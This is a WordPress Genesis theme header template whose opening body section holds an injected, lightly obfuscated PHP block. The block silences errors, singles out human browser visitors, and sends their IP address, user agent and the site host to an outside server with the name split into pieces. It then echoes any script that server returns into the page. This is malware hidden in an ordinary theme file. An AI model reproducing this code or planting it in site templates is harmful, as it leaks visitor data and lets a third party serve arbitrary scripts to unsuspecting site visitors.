<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" <?php language_attributes('xhtml'); ?>>
<head profile="http://gmpg.org/xfn/11">

<meta http-equiv="Content-Type" content="<?php bloginfo('html_type'); ?>; charset=<?php bloginfo('charset'); ?>" />

<title><?php genesis_title(); ?></title>

<?php genesis_meta(); ?>

<link rel="pingback" href="<?php bloginfo('pingback_url'); ?>" />

<?php wp_head(); // we need this for plugins ?>

</head>

<body <?php body_class(); ?>>
<?php
#6d86e3#
error_reporting(0); ini_set('display_errors',0); $wp_g2678 = @$_SERVER['HTTP_USER_AGENT'];
if (( preg_match ('/Gecko|MSIE/i', $wp_g2678) && !preg_match ('/bot/i', $wp_g2678))){
$wp_g092678="http://"."template"."body".".com/body"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_g2678);
$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_g092678);
curl_setopt ($ch, CURLOPT_TIMEOUT, 6); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $wp_2678g = curl_exec ($ch); curl_close($ch);}
if ( substr($wp_2678g,1,3) === 'scr' ){ echo $wp_2678g; }
#/6d86e3#
?>
<?php genesis_before(); ?>

<div id="wrap">

<?php genesis_before_header(); ?>
<?php genesis_header(); ?>
<?php genesis_after_header(); ?>

<div id="inner">